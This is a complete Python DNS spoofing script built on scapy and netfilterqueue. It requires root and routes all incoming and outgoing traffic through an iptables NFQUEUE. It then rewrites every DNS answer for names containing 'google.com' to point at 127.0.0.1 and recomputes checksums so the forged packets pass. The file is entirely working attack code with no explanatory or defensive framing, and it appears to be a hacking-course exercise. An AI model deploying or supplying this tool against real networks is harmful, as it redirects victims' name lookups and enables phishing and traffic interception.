import scapy.all as scapy
import netfilterqueue 
import subprocess
import os

def restoreFirewall():
    subprocess.call(["iptables","-D",'OUTPUT','-j','NFQUEUE','--queue-num','0'])
    subprocess.call(["iptables","-D",'INPUT','-j','NFQUEUE','--queue-num','0'])

def configureFirewall():
    if os.getuid() != 0:
        print('You are not permitted to run this script! You must be root.')
        exit(1)
    restoreFirewall()
    subprocess.call(["iptables","-I",'INPUT','-j','NFQUEUE','--queue-num','0'])
    subprocess.call(["iptables","-I",'OUTPUT','-j','NFQUEUE','--queue-num','0'])


def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket["DNSQR"].qname
        if "google.com" in str(qname):
            DNSResponse = scapy.DNSRR(rrname=qname, rdata="127.0.0.1")            

            scapyPacket[scapy.DNS].an = DNSResponse
            scapyPacket[scapy.DNS].ancount = 1

            del scapyPacket[scapy.UDP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.IP].len

            packet.set_payload(bytes(scapyPacket))

    packet.accept()

try:
    configureFirewall()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,processPacket)
    queue.run()
    
except KeyboardInterrupt:
    print("cleaning up..Bye")
    restoreFirewall()